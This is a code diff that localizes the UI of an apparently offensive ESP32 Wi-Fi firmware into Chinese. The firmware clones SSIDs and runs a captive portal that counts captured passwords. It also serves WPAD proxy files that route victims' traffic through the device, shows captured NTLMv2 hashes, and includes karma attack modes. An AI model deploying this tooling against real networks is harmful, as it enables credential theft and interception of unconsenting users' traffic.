       File editFile = SD.open(editFileName, FILE_READ);
       if (!editFile) {
           Serial.println("Failed to open file for reading: " + editFileName);
-          server.send(500, "text/html", "<html><body><p>Failed to open file for reading.</p><script>setTimeout(function(){window.history.back();}, 1000);</script></body></html>");
+          server.send(500, "text/html", "<html><head><meta charset='UTF-8'></head><body><p>无法打开文件进行读取。</p><script>setTimeout(function(){window.history.back();}, 1000);</script></body></html>");
           return;
       }
   
       Serial.println("File opened successfully: " + editFileName);
   
       // Page start with unified admin style
-      String htmlContent = adminPageStart(String("Edit File: ") + editFileName);
+      String htmlContent = adminPageStart(String("编辑文件: ") + editFileName);
       htmlContent += "<form id='editForm' method='post' enctype='multipart/form-data'>";
       htmlContent += "<input type='hidden' name='filename' value='" + editFileName + "'>";
       htmlContent += "<textarea id='content' name='content'>";
@@ -5125,7 +5350,7 @@ server.on("/evil-menu", HTTP_GET, []() {
   
       // Complete the HTML
       htmlContent = "</textarea><br>";
-      htmlContent += "<div class='actions'><button class='btn p' type='button' onclick='submitForm()'>Save</button></div>";
+      htmlContent += "<div class='actions'><button class='btn p' type='button' onclick='submitForm()'>保存文件</button></div>";
       htmlContent += "</form>";
       htmlContent += "<script>";
       htmlContent += "function submitForm() {";
@@ -5138,10 +5363,10 @@ server.on("/evil-menu", HTTP_GET, []() {
       htmlContent += "  xhr.open('POST', '/save-file', true);";
       htmlContent += "  xhr.onload = function () {";
       htmlContent += "    if (xhr.status === 200) {";
-      htmlContent += "      alert('File saved successfully!');";
+      htmlContent += "      alert('文件保存成功！');";
       htmlContent += "      window.history.back();";
       htmlContent += "    } else {";
-      htmlContent += "      alert('An error occurred while saving the file.');";
+      htmlContent += "      alert('保存文件时出错。');";
       htmlContent += "    }";
       htmlContent += "  };";
       htmlContent += "  xhr.send(formData);";
@@ -5160,9 +5385,9 @@ server.on("/evil-menu", HTTP_GET, []() {
       if (!guardAdmin()) return;
       // This is called after the file upload is complete
       if (!isSaveFileAuthorized) {
-          server.send(403, "text/html", "<html><body><p>Unauthorized.</p><script>setTimeout(function(){window.history.back();}, 1000);</script></body></html>");
+          server.send(403, "text/html", "<html><head><meta charset='UTF-8'></head><body><p>未授权操作。</p><script>setTimeout(function(){window.history.back();}, 1000);</script></body></html>");
       } else {
-          server.send(200, "text/html", "<html><body><p>File saved successfully!</p><script>setTimeout(function(){window.history.back();}, 1000);</script></body></html>");
+          server.send(200, "text/html", "<html><head><meta charset='UTF-8'></head><body><p>文件保存成功！</p><script>setTimeout(function(){window.history.back();}, 1000);</script></body></html>");
       }
       // Reset authorization flag
       isSaveFileAuthorized = false;
@@ -5183,9 +5408,9 @@ server.on("/evil-menu", HTTP_GET, []() {
       
       // Récupération des informations de monitor
       String ssid = clonedSSID;
-      String portalStatus = isCaptivePortalOn ? "On" : "Off";
+      String portalStatus = isCaptivePortalOn ? "开启" : "关闭";
       String page = selectedPortalFile.substring(12);
-      String wifiStatus = wificonnected ? "Y" : "N";
+      String wifiStatus = wificonnected ? "已连接" : "未连接";
       String ip = ipAddress;
       int numClients = WiFi.softAPgetStationNum();
       int numPasswords = countPasswordsInFile();
@@ -5196,32 +5421,32 @@ server.on("/evil-menu", HTTP_GET, []() {
 
       String content;
       content += F("<table>");
-      content += F("<tr><th>Field</th><th>Value</th></tr>");
-      content += String("<tr><td>SSID</td><td><span id='v_ssid'>") + ssid + "</span></td></tr>";
-      content += String("<tr><td>Portal Status</td><td><span id='v_portal'>") + portalStatus + "</span></td></tr>";
-      content += String("<tr><td>Page</td><td><span id='v_page'>") + page + "</span></td></tr>";
-      content += String("<tr><td>Connected</td><td><span id='v_connected'>") + wifiStatus + "</span></td></tr>";
-      content += String("<tr><td>IP Address</td><td><span id='v_ip'>") + ip + "</span></td></tr>";
-      content += String("<tr><td>Clients Connected</td><td><span id='v_clients'>") + String(numClients) + "</span></td></tr>";
-      content += String("<tr><td>Passwords Count</td><td><span id='v_pwds'>") + String(numPasswords) + "</span></td></tr>";
-      content += String("<tr><td>Stack Left</td><td><span id='v_stack'>") + stackLeft + " KB</span></td></tr>";
-      content += String("<tr><td>RAM Usage</td><td><span id='v_ram'>") + ramUsage + " KB</span></td></tr>";
-      content += String("<tr><td>Battery Level</td><td><span id='v_battery'>") + batteryLevel + "%</span></td></tr>";
-      content += String("<tr><td>Uptime</td><td><span id='v_uptime'>") + String(millis() / 1000) + " seconds</span></td></tr>";
+      content += F("<tr><th>监控项</th><th>当前值</th></tr>");
+      content += String("<tr><td>热点 SSID</td><td><span id='v_ssid'>") + ssid + "</span></td></tr>";
+      content += String("<tr><td>认证门户状态</td><td><span id='v_portal'>") + portalStatus + "</span></td></tr>";
+      content += String("<tr><td>门户页面模板</td><td><span id='v_page'>") + page + "</span></td></tr>";
+      content += String("<tr><td>STA 联网状态</td><td><span id='v_connected'>") + wifiStatus + "</span></td></tr>";
+      content += String("<tr><td>设备 IP 地址</td><td><span id='v_ip'>") + ip + "</span></td></tr>";
+      content += String("<tr><td>已连接客户端数</td><td><span id='v_clients'>") + String(numClients) + "</span></td></tr>";
+      content += String("<tr><td>已捕获凭据数</td><td><span id='v_pwds'>") + String(numPasswords) + "</span></td></tr>";
+      content += String("<tr><td>剩余栈空间</td><td><span id='v_stack'>") + stackLeft + " KB</span></td></tr>";
+      content += String("<tr><td>可用内存 (RAM)</td><td><span id='v_ram'>") + ramUsage + " KB</span></td></tr>";
+      content += String("<tr><td>电池电量</td><td><span id='v_battery'>") + batteryLevel + "%</span></td></tr>";
+      content += String("<tr><td>运行时间</td><td><span id='v_uptime'>") + String(millis() / 1000) + " 秒</span></td></tr>";
       content += F("</table>");
       content += F("<script>\n"
                    "function apply(d){\n"
-                   "  var map={v_ssid:d.ssid, v_portal:(d.portalOn?'On':'Off'), v_page:d.page,\n"
-                   "            v_connected:(d.connected?'Y':'N'), v_ip:d.ip, v_clients:d.clients,\n"
+                   "  var map={v_ssid:d.ssid, v_portal:(d.portalOn?'开启':'关闭'), v_page:d.page,\n"
+                   "            v_connected:(d.connected?'已连接':'未连接'), v_ip:d.ip, v_clients:d.clients,\n"
                    "            v_pwds:d.passwords, v_stack:d.stack+' KB', v_ram:d.ram+' KB',\n"
-                   "            v_battery:d.battery+'%', v_uptime:d.uptime+' seconds'};\n"
+                   "            v_battery:d.battery+'%', v_uptime:d.uptime+' 秒'};\n"
                    "  for (var k in map){ var el=document.getElementById(k); if(el) el.textContent=map[k]; }\n"
                    "}\n"
                    "function poll(){ fetch('/monitor-status.json',{cache:'no-store'})\n"
                    "  .then(r=>r.json()).then(apply).catch(()=>{});}\n"
                    "poll(); setInterval(poll,2000);\n"
                    "</script>");
-      server.send(200, "text/html", wrapAdminPage("Monitor Status", content));
+      server.send(200, "text/html", wrapAdminPage("运行状态监控", content));
   });
 
   server.on("/scan-network", HTTP_GET, []() {
@@ -5230,12 +5455,12 @@ server.on("/evil-menu", HTTP_GET, []() {
       String content;
       content += F("<div style='display:flex;flex-direction:column;align-items:center;gap:12px'>");
       content += F("<div style='width:48px;height:48px;border:4px solid rgba(255,255,255,.25);border-top-color:#4c7dff;border-radius:50%;animation:spin 1s linear infinite'></div>");
-      content += F("<div>Please wait for the scan to complete…</div>");
-      content += F("<div class='mut'>When finished this page will auto-return and you can check on SD card the result.</div>");
+      content += F("<div>正在执行内网扫描，请稍候…</div>");
+      content += F("<div class='mut'>扫描完成后页面将自动跳转，您可以在 SD 卡中查看完整报告。</div>");
       content += F("</div>");
       content += F("<style>@keyframes spin{to{transform:rotate(360deg)}}</style>");
       content += F("<script>(function(){function check(){fetch('/scan-status').then(r=>r.text()).then(t=>{if((t||'').trim()==='done'){location.href='/evil-menu';}else{setTimeout(check,1000);}}).catch(()=>setTimeout(check,1500));}setTimeout(check,1000);}())</script>");
-      server.send(200, "text/html", wrapAdminPage("Scanning Network", content));
+      server.send(200, "text/html", wrapAdminPage("正在扫描网络", content));
       FullNetworkAnalysis(true);
   }); 
 
@@ -5375,7 +5600,7 @@ server.on("/evil-menu", HTTP_GET, []() {
     pixels.show();
   }
   if (!isProbeKarmaAttackMode && !isAutoKarmaActive) {
-    waitAndReturnToMenu("Portal " + ssid + " Deployed");
+    waitAndReturnToMenu("门户已部署: " + ssid);
   }
 }
 
@@ -5394,15 +5619,15 @@ https://learn.microsoft.com/en-us/openspecs/office_protocols/ms-grvhenc/b9e676e7
 WiFiServer proxy(80);
 
 const char wpad_dat[] PROGMEM = R"RAW(
-function FindProxyForURL(url, host) {
+var FindProxyForURL = function(url, host) {
   return "PROXY 192.168.4.1:80; DIRECT";
-}
+};
 )RAW";
 
 const char wpad_dat172[] PROGMEM = R"RAW(
-function FindProxyForURL(url, host) {
+var FindProxyForURL = function(url, host) {
   return "PROXY 172.0.0.1:80; DIRECT";
-}
+};
 )RAW";
 // =================== Utils ===================
 
@@ -5833,7 +6058,7 @@ void showWaitingAnimationNTLM() {
 
   // ---- header ----
   d.fillScreen(TFT_BLACK);
-  d.setTextSize(1.5);
+  evilSetCnFont(d, 1.5);
   d.setTextColor(TFT_WHITE, TFT_BLACK);
 
   // centre de l'animation
@@ -5940,13 +6165,13 @@ void showWaitingAnimationNTLM() {
   }
 
   d.setCursor(5, 5);
-  d.print("Waiting WPAD.DAT on \n " + clonedSSID);
+  d.print("等待 WPAD.DAT 于 \n " + clonedSSID);
   
   // ---- footer discrète ----
-  d.setTextSize(1);
+  evilSetCnFont(d, 1);
   d.setTextColor(TFT_DARKGREY, TFT_BLACK);
   d.setCursor(5, d.height() - 12);
-  d.print("Press BACKSPACE to exit");
+  d.print("按 BACKSPACE 退出");
 
   // avance temps
   t++;
@@ -5976,39 +6201,39 @@ void updateHashUiNTLM() {
   d.fillScreen(BLACK);
 
   // 1) NTLM count
-  d.setTextSize(1.3);
+  evilSetCnFont(d, 1.3);
   d.setTextColor(WHITE, BLACK);
   d.setCursor(5, 5);
   d.print("NTLMv2: ");
-  d.setTextSize(2);
+  evilSetCnFont(d, 2);
   d.print(ntlmHashCount);
 
   // 2) User
-  d.setTextSize(1.3);
+  evilSetCnFont(d, 1.3);
   d.setCursor(5, 35);
-  d.print("User: ");
-  d.setTextSize(2);
+  d.print("用户: ");
+  evilSetCnFont(d, 2);
   d.print(ntlmLastUser);
 
   // 3) Domain
-  d.setTextSize(1.3);
+  evilSetCnFont(d, 1.3);
   d.setCursor(5, 65);
-  d.print("Domain: ");
-  d.setTextSize(2);
+  d.print("域名: ");
+  evilSetCnFont(d, 2);
   d.print(ntlmLastDomain);
 
   // 4) Client (IP)
-  d.setTextSize(1.3);
+  evilSetCnFont(d, 1.3);
   d.setCursor(5, 95);
-  d.print("Client: ");
-  d.setTextSize(2);
+  d.print("客户端: ");
+  evilSetCnFont(d, 2);
   d.print(ntlmLastClient);
 
   // footer
-  d.setTextSize(1);
+  evilSetCnFont(d, 1);
   d.setCursor(5, d.height() - 12);
   d.setTextColor(TFT_DARKGREY, BLACK);
-  d.print("Press BACKSPACE to exit");
+  d.print("按 BACKSPACE 退出");
 }
 
 // =================== Setup / Loop ===================
@@ -6056,7 +6281,7 @@ void wpadAbuse() {
       proxy.stop();
       dnsServer.stop();
       WiFi.mode(WIFI_MODE_APSTA);
-      waitAndReturnToMenu("Return to menu");
+      waitAndReturnToMenu("返回菜单");
       return;
     }
 
@@ -6170,7 +6395,7 @@ void handleSdCardBrowse() {
 
     File dir = SD.open(dirPath);
     if (!dir || !dir.isDirectory()) {
-        server.send(404, "text/html", "<html><body><p>Directory not found.</p><script>setTimeout(function(){window.history.back();}, 1000);</script></body></html>");
+        server.send(404, "text/html", "<html><head><meta charset='UTF-8'></head><body><p>未找到目录。</p><script>setTimeout(function(){window.history.back();}, 1000);</script></body></html>");
         return;
     }
 
@@ -6195,14 +6420,14 @@ void handleSdCardBrowse() {
                  "}</style>");
     content += F("<div class='sd'>");
     content += F("<div class='tb'>");
-    content += "<a class='btn sd-sm' href='/download-all-files?dir=" + dirPath + "'>Download ALL</a>";
-    content += "<div style='margin-left:10px;color:var(--mut);font-size:12px'>Remote path</div>";
+    content += "<a class='btn sd-sm' href='/download-all-files?dir=" + dirPath + "'>下载全部</a>";
+    content += "<div style='margin-left:10px;color:var(--mut);font-size:12px'>远程路径</div>";
     content += "<span class='pill'>" + htmlEscape(dirPath) + "</span>";
     content += F("</div>");
-    content += F("<div class='hdr'><div></div><div>Name</div><div>Size</div><div>Actions</div></div>");
+    content += F("<div class='hdr'><div></div><div>名称</div><div>大小</div><div>操作</div></div>");
     content += getDirectoryHtml(dir, dirPath);
     content += F("</div>");
-    server.send(200, "text/html", wrapAdminPage("Remote File Browser", content));
+    server.send(200, "text/html", wrapAdminPage("远程文件浏览", content));
     dir.close();
 }
 
@@ -6245,13 +6470,13 @@ String getDirectoryHtml(File dir, String path) {
         String target = path + (path.endsWith("/") ? "" : "/") + name;
         if (!target.startsWith("/")) target = "/" + target;
         if (isdir) {
-            dirsHtml += "<li class='dir'><div class='icon'></div><a href='/check-sd-file?dir=" + target + "'>" + htmlEscape(name) + "</a><div class='sz'>DIR</div><div class='acts'></div></li>";
+            dirsHtml += "<li class='dir'><div class='icon'></div><a href='/check-sd-file?dir=" + target + "'>" + htmlEscape(name) + "</a><div class='sz'>目录</div><div class='acts'></div></li>";
         } else {
             filesHtml += "<li class='file'><div class='icon'></div><a href='/download-sd-file?filename=" + target + "'>" + htmlEscape(name) + "</a><div class='sz'>" + humanReadableSize(sz) + "</div><div class='acts'>";
             if (name.endsWith(".txt") || name.endsWith(".html") || name.endsWith(".ini")) {
-                filesHtml += "<a class='edit' href='/edit-file?filename=" + target + "'>[Edit]</a>";
+                filesHtml += "<a class='edit' href='/edit-file?filename=" + target + "'>[编辑]</a>";
             }
-            filesHtml += "<a class='del' href='#' onclick=\"if(confirm('Delete " + htmlEscape(name) + " ?')) location.href='/delete-sd-file?filename=" + target + "'; return false;\">[Delete]</a>";
+            filesHtml += "<a class='del' href='#' onclick=\"if(confirm('确认删除 " + htmlEscape(name) + " ?')) location.href='/delete-sd-file?filename=" + target + "'; return false;\">[删除]</a>";
             filesHtml += "</div></li>";
         }
         f.close();
@@ -6261,7 +6486,7 @@ String getDirectoryHtml(File dir, String path) {
     if (path != "/") {
         String parentPath = path.substring(0, path.lastIndexOf('/'));
         if (parentPath == "") parentPath = "/";
-        html += "<li class='up dir'><div class='icon'></div><a href='/check-sd-file?dir=" + parentPath + "'>[ Up ]</a><div class='sz'>DIR</div><div class='acts'></div></li>";
+        html += "<li class='up dir'><div class='icon'></div><a href='/check-sd-file?dir=" + parentPath + "'>[ 上级目录 ]</a><div class='sz'>目录</div><div class='acts'></div></li>";
     }
     html += dirsHtml;
     html += filesHtml;
@@ -6287,7 +6512,7 @@ void handleFileDownload() {
       return;
     }
   }
-  server.send(404, "text/html", "<html><body><p>File not found.</p><script>setTimeout(function(){window.history.back();}, 1000);</script></body></html>");
+  server.send(404, "text/html", "<html><head><meta charset='UTF-8'></head><body><p>未找到文件。</p><script>setTimeout(function(){window.history.back();}, 1000);</script></body></html>");
 }
 
 
@@ -6299,7 +6524,7 @@ void handleDownloadAllFiles() {
 
   File dir = SD.open(dirPath);
   if (!dir || !dir.isDirectory()) {
-    server.send(404, "text/html", "<html><body><p>Directory not found.</p></body></html>");
+    server.send(404, "text/html", "<html><head><meta charset='UTF-8'></head><body><p>未找到目录。</p></body></html>");
     return;
   }
 
@@ -6357,7 +6582,7 @@ void handleFileUpload() {
     fsUploadFile = SD.open(fullPath, FILE_WRITE);
     if (!fsUploadFile) {
       Serial.println("Upload start failed: Unable to open file " + fullPath);
-      server.send(500, "text/html", "File opening failed");
+      server.send(500, "text/html", "打开文件失败");
       return;
     }
 
@@ -6369,7 +6594,7 @@ void handleFileUpload() {
       if (written != upload.currentSize) {
         Serial.println(F("Write Error: Inconsistent data size."));
         fsUploadFile.close();
-        server.send(500, "text/html", "File write error");
+        server.send(500, "text/html", "写入文件错误");
         return;
       }
     } else {
@@ -6388,10 +6613,10 @@ void handleFileUpload() {
       fsUploadFile.close();
       Serial.print(F("Upload End: "));
       Serial.println(upload.totalSize);
-      server.send(200, "text/html", "<html><body><p>File successfully uploaded</p><script>setTimeout(function(){window.history.back();}, 1000);</script></body></html>");
+      server.send(200, "text/html", "<html><head><meta charset='UTF-8'></head><body><p>文件上传成功</p><script>setTimeout(function(){window.history.back();}, 1000);</script></body></html>");
       Serial.println(F("File successfully uploaded"));
     } else {
-      server.send(500, "text/html", "File closing error");
+      server.send(500, "text/html", "关闭文件错误");
       Serial.println(F("File closing error"));
     }
   }
@@ -6465,18 +6690,18 @@ void handleFileDelete() {
   }
   if (SD.exists(fileName)) {
     if (SD.remove(fileName)) {
-      server.send(200, "text/html", "<html><body><p>File deleted successfully</p></body></html>");
+      server.send(200, "text/html", "<html><head><meta charset='UTF-8'></head><body><p>文件删除成功</p></body></html>");
       Serial.println(F("-------------------"));
       Serial.println(F("File deleted successfully"));
       Serial.println(F("-------------------"));
     } else {
-      server.send(500, "text/html", "<html><body><p>File could not be deleted</p><script>setTimeout(function(){window.history.back();}, 1000);</script></body></html>");
+      server.send(500, "text/html", "<html><head><meta charset='UTF-8'></head><body><p>无法删除文件</p><script>setTimeout(function(){window.history.back();}, 1000);</script></body></html>");
       Serial.println(F("-------------------"));
       Serial.println(F("File could not be deleted"));
       Serial.println(F("-------------------"));
     }
   } else {
-    server.send(404, "text/html", "<html><body><p>File not found</p><script>setTimeout(function(){window.history.back();}, 1000);</script></body></html>");
+    server.send(404, "text/html", "<html><head><meta charset='UTF-8'></head><body><p>未找到文件</p><script>setTimeout(function(){window.history.back();}, 1000);</script></body></html>");
     Serial.println(F("-------------------"));
     Serial.println(F("File not found"));
     Serial.println(F("-------------------"));
@@ -6493,7 +6718,7 @@ void servePortalFile(const String & filename) {
       Serial.println(F("-------------------"));*/
     webFile.close();
   } else {
-    server.send(404, "text/html", "<html><body><p>File not found</p><script>setTimeout(function(){window.history.back();}, 1000);</script></body></html>");
+    server.send(404, "text/html", "<html><head><meta charset='UTF-8'></head><body><p>未找到文件</p><script>setTimeout(function(){window.history.back();}, 1000);</script></body></html>");
   }
 }
 
@@ -6545,7 +6770,7 @@ void stopCaptivePortal() {
     pixels.setPixelColor(0, pixels.Color(0, 0, 0));
     pixels.show();
   }
-  waitAndReturnToMenu("  Portal Stopped");
+  waitAndReturnToMenu("  门户已停止");
 }
 
 /*
@@ -6599,7 +6824,7 @@ void changePortal() {
       int listStartIndex = max(0, min(portalFileIndex, numPortalFiles - listDisplayLimit));
 
       M5.Display.clear();
-      M5.Display.setTextSize(1.5);
+      evilSetCnFont(M5.Display, 1.5);
       M5.Display.setTextColor(menuTextUnFocusedColor);
       M5.Display.setCursor(10, 10);
 
@@ -6636,7 +6861,7 @@ void changePortal() {
         Serial.println(F("-------------------"));
         Serial.println(selectedPortalFile.substring(12) + " portal selected.");
         Serial.println(F("-------------------"));
-        waitAndReturnToMenu(selectedPortalFile.substring(12) + " selected");
+        waitAndReturnToMenu("已选择 " + selectedPortalFile.substring(12));
         break; // Sortir de la boucle
       } else if (kp(KEY_BACKSPACE)) {
         inMenu = true;
@@ -6728,7 +6953,7 @@ void checkCredentials() {
 void displayCredentials(int index) {
   // Clear the display and set up text properties
   M5.Display.clear();
-  M5.Display.setTextSize(1.5);
+  evilSetCnFont(M5.Display, 1.5);
 
   const int lineHeight = 15; // Réduire l'espace entre les lignes
   int maxVisibleLines = 9; // Nombre maximum de lignes affichables à l'écran
@@ -6781,10 +7006,10 @@ Confirm pop up yes/no
 
 void okPopup(String message) {
   M5.Display.clear();
-  M5.Display.setTextSize(1.5);
+  evilSetCnFont(M5.Display, 1.5);
 
-  int messageWidth = message.length() * 9;  // Approximate character width
-  int startX = (M5.Display.width() - messageWidth) / 2;
+  int messageWidth = M5.Display.textWidth(message);
+  int startX = max(4, (M5.Display.width() - messageWidth) / 2);
 
   M5.Display.setCursor(startX, M5.Display.height() / 2 - 20);
   M5.Display.setTextColor(menuTextUnFocusedColor, TFT_BLACK);
@@ -6792,8 +7017,8 @@ void okPopup(String message) {
 
   // Draw OK button
   M5.Display.setTextColor(TFT_BLUE);
-  M5.Display.setCursor((M5.Display.width() - 18) / 2, M5.Display.height() / 2 + 20);
-  M5.Display.print("OK");
+  M5.Display.setCursor((M5.Display.width() - 24) / 2, M5.Display.height() / 2 + 20);
+  M5.Display.print("确定");
 
   M5.Display.display();
   enterDebounce();
@@ -6812,21 +7037,21 @@ bool confirmPopup(String message) {
   bool decisionMade = false;
 
   M5.Display.clear();
-  M5.Display.setTextSize(1.5);
-  int messageWidth = message.length() * 9;  // Each character is 6 pixels wide
-  int startX = (M5.Display.width() - messageWidth) / 2;  // Calculate starting X position
+  evilSetCnFont(M5.Display, 1.5);
+  int messageWidth = M5.Display.textWidth(message);
+  int startX = max(4, (M5.Display.width() - messageWidth) / 2);
 
   M5.Display.setCursor(startX, M5.Display.height() / 2);
   M5.Display.setTextColor(menuTextUnFocusedColor, TFT_BLACK);
   M5.Display.println(message);
 
   M5.Display.setTextColor(TFT_GREEN);
-  M5.Display.setCursor(60, 110);
-  M5.Display.print("Y");
+  M5.Display.setCursor(50, 110);
+  M5.Display.print("是(Y)");
 
   M5.Display.setTextColor(TFT_RED);
-  M5.Display.setCursor(M5.Display.width() - 60, 110);
-  M5.Display.print("N");
+  M5.Display.setCursor(M5.Display.width() - 80, 110);
+  M5.Display.print("否(N)");
 
   M5.Display.setTextColor(menuTextFocusedColor, menuBackgroundColor);
   M5.Display.display();
@@ -6855,24 +7080,24 @@ Delete credentials
 ============================================================================================================================
 */
 void deleteCredentials() {
-  if (confirmPopup("Delete credentials?")) {
+  if (confirmPopup("确认删除凭据?")) {
     File file = SD.open("/evil/credentials.txt", FILE_WRITE);
     if (file) {
       file.close();
       Serial.println(F("-------------------"));
       Serial.println(F("credentials.txt deleted"));
       Serial.println(F("-------------------"));
-      waitAndReturnToMenu("Deleted successfully");
+      waitAndReturnToMenu("删除成功");
       Serial.println(F("Credentials deleted successfully"));
     } else {
       Serial.println(F("-------------------"));
       Serial.println(F("Error deleteting credentials.txt "));
       Serial.println(F("-------------------"));
-      waitAndReturnToMenu("Error..");
+      waitAndReturnToMenu("删除出错..");
       Serial.println(F("Error opening file for deletion"));
     }
   } else {
-    waitAndReturnToMenu("Deletion cancelled");
+    waitAndReturnToMenu("已取消删除");
   }
 }
 
@@ -6909,26 +7134,26 @@ String wificonnectedPrint = "";
 
 void displayMonitorPage1() {
   M5.Display.clear();
-  M5.Display.setTextSize(1.5);
+  evilSetCnFont(M5.Display, 1.5);
   M5.Lcd.setTextColor(menuTextUnFocusedColor, TFT_BLACK);
 
   if (WiFi.localIP().toString() != "0.0.0.0") {
     wificonnected = true;
-    wificonnectedPrint = "Y";
+    wificonnectedPrint = "是";
     ipAddress = WiFi.localIP().toString();
   } else {
     wificonnected = false;
-    wificonnectedPrint = "N";
+    wificonnectedPrint = "否";
     ipAddress = "           ";
   }
   M5.Display.setCursor(5, 45);
   M5.Display.println("SSID: " + clonedSSID);
   M5.Display.setCursor(5, 60);
-  M5.Display.println("Portal: " + String(isCaptivePortalOn ? "On" : "Off"));
+  M5.Display.println("门户: " + String(isCaptivePortalOn ? "开" : "关"));
   M5.Display.setCursor(5, 75);
-  M5.Display.println("Page: " + selectedPortalFile.substring(12));
+  M5.Display.println("页面: " + selectedPortalFile.substring(12));
   M5.Display.setCursor(5, 90);
-  M5.Display.println("Connected : " + wificonnectedPrint);
+  M5.Display.println("已连接: " + wificonnectedPrint);
   M5.Display.setCursor(5, 105);
   M5.Display.println("IP : " + ipAddress);
 
@@ -6959,16 +7184,16 @@ void displayMonitorPage1() {
     int newNumPasswords = countPasswordsInFile();
 
     if (newNumClients != oldNumClients) {
-      M5.Display.fillRect(0, 15, 50, 10, menuBackgroundColor);
+      M5.Display.fillRect(0, 15, 120, 12, menuBackgroundColor);
       M5.Display.setCursor(5, 15);
-      M5.Display.println("Clients: " + String(newNumClients));
+      M5.Display.println("客户端: " + String(newNumClients));
       oldNumClients = newNumClients;
     }
 
     if (newNumPasswords != oldNumPasswords) {
-      M5.Display.fillRect(0, 30, 50, 10, menuBackgroundColor);
+      M5.Display.fillRect(0, 30, 120, 12, menuBackgroundColor);
       M5.Display.setCursor(5, 30);
-      M5.Display.println("Passwords: " + String(newNumPasswords));
+      M5.Display.println("捕获密码: " + String(newNumPasswords));
       oldNumPasswords = newNumPasswords;
     }
 
@@ -7011,7 +7236,7 @@ static void logDiffsAndMakeTicker(const String before[], int nBefore,
   for (int i = 0; i < nAfter; ++i) {
     if (!containsMac(before, nBefore, after[i])) {
       Serial.print(F("[+] Join: ")); Serial.println(after[i]);
-      tickerMsg = "Join " + after[i];
+      tickerMsg = "接入 " + after[i];
       tickerUntilMs = millis() + 1200;
       return;
     }
@@ -7019,7 +7244,7 @@ static void logDiffsAndMakeTicker(const String before[], int nBefore,
   for (int i = 0; i < nBefore; ++i) {
     if (!containsMac(after, nAfter, before[i])) {
       Serial.print(F("[-] Leave: ")); Serial.println(before[i]);
-      tickerMsg = "Leave " + before[i];
+      tickerMsg = "断开 " + before[i];
       tickerUntilMs = millis() + 1200;
       return;
     }
@@ -7060,7 +7285,7 @@ void displayMonitorPage2() {
 
   // Pré-affichage
   M5.Display.clear();
-  M5.Display.setTextSize(1.5);
+  evilSetCnFont(M5.Display, 1.5);
   M5.Lcd.setTextColor(menuTextUnFocusedColor, TFT_BLACK);
 
   // snapshot initial
@@ -7070,7 +7295,7 @@ void displayMonitorPage2() {
 
   auto drawHeader = [&](){
     M5.Display.setCursor(5, 5);
-    M5.Display.println("Connected MACs (" + String(numConnectedMACs) + ")");
+    M5.Display.println("已连接 MAC (" + String(numConnectedMACs) + ")");
   };
 
   auto drawList = [&](){
@@ -7326,7 +7551,7 @@ const long updateInterval = 1000;
 
 void displayMonitorPage3() {
   M5.Display.clear();
-  M5.Display.setTextSize(1.5);
+  evilSetCnFont(M5.Display, 1.5);
   M5.Lcd.setTextColor(menuTextUnFocusedColor, TFT_BLACK);
 
   oldStack = getStack();
@@ -7334,11 +7559,11 @@ void displayMonitorPage3() {
   oldBatteryLevel = getBatteryLevel();
 
   M5.Display.setCursor(10 / 4, 15);
-  M5.Display.println("Stack left: " + oldStack + " Kb");
+  M5.Display.println("剩余栈: " + oldStack + " KB");
   M5.Display.setCursor(10 / 4, 30);
-  M5.Display.println("RAM: " + oldRamUsage + " Ko");
+  M5.Display.println("可用内存: " + oldRamUsage + " KB");
   M5.Display.setCursor(10 / 4, 45);
-  M5.Display.println("Battery: " + oldBatteryLevel + "%");
+  M5.Display.println("电量: " + oldBatteryLevel + "%");
 
   M5.Display.display();
   lastUpdateTime = millis();
@@ -7376,19 +7601,19 @@ void displayMonitorPage3() {
       // Afficher les valeurs mises à jour
       if (newStack != oldStack) {
         M5.Display.setCursor(10 / 4, 15);
-        M5.Display.println("Stack left: " + newStack + " Kb");
+        M5.Display.println("剩余栈: " + newStack + " KB");
         oldStack = newStack;
       }
 
       if (newRamUsage != oldRamUsage) {
         M5.Display.setCursor(10 / 4, 30);
-        M5.Display.println("RAM: " + newRamUsage + " Ko");
+        M5.Display.println("可用内存: " + newRamUsage + " KB");
         oldRamUsage = newRamUsage;
       }
 
       if (newBatteryLevel != oldBatteryLevel) {
         M5.Display.setCursor(10 / 4, 45);
-        M5.Display.println("Battery: " + newBatteryLevel + "%");
+        M5.Display.println("电量: " + newBatteryLevel + "%");
         oldBatteryLevel = newBatteryLevel;
       }
 
@@ -7459,52 +7684,55 @@ void karmaAttack() {
 void waitAndReturnToMenu(String message) {
   const int screenWidth = 240;
   const int screenHeight = 135;
-  const int charWidth = 10;  // Largeur approximative d'un caractère
-  const int maxCharsPerLine = screenWidth / charWidth;
+  const int maxPxPerLine = screenWidth - 16;
 
   M5.Display.clear();
-  M5.Display.setTextSize(1.5);
+  evilSetCnFont(M5.Display, 1.5);
   M5.Display.setTextColor(menuTextUnFocusedColor);
 
-  // Découper le message en plusieurs lignes
+  // UTF-8 safe pixel-width wrapping
   std::vector<String> lines;
   String currentLine = "";
-  for (int i = 0; i < message.length(); i++) {
-    char currentChar = message.charAt(i);
-    if (currentChar == ' ' && currentLine.length() >= maxCharsPerLine) {
+  const char* s = message.c_str();
+  size_t len = message.length();
+  size_t i = 0;
+  while (i < len) {
+    uint8_t c = (uint8_t)s[i];
+    if (c == '\n') {
       lines.push_back(currentLine);
       currentLine = "";
+      i++;
+      continue;
     }
-    currentLine += currentChar;
-
-    // Si la ligne dépasse la longueur maximale
-    if (currentLine.length() >= maxCharsPerLine) {
-      int lastSpace = currentLine.lastIndexOf(' ');
-      if (lastSpace != -1) {
-        // Couper à l'espace le plus proche pour éviter de couper un mot
-        lines.push_back(currentLine.substring(0, lastSpace));
-        currentLine = currentLine.substring(lastSpace + 1);
-      } else {
-        lines.push_back(currentLine);
-        currentLine = "";
-      }
+    size_t clen = 1;
+    if ((c & 0x80) == 0x00) clen = 1;
+    else if ((c & 0xE0) == 0xC0) clen = 2;
+    else if ((c & 0xF0) == 0xE0) clen = 3;
+    else if ((c & 0xF8) == 0xF0) clen = 4;
+    if (i + clen > len) clen = len - i;
+    String ch = message.substring(i, i + clen);
+    String candidate = currentLine + ch;
+    if (currentLine.length() > 0 && M5.Display.textWidth(candidate) > maxPxPerLine) {
+      lines.push_back(currentLine);
+      currentLine = (ch == " ") ? "" : ch;
+    } else {
+      currentLine = candidate;
     }
+    i += clen;
   }
   if (currentLine.length() > 0) {
     lines.push_back(currentLine);
   }
 
-  // Calculer la position de départ pour centrer verticalement
-  int totalTextHeight = lines.size() * 12;  // 20 pixels par ligne (environ)
-  int startY = (screenHeight - totalTextHeight) / 2;
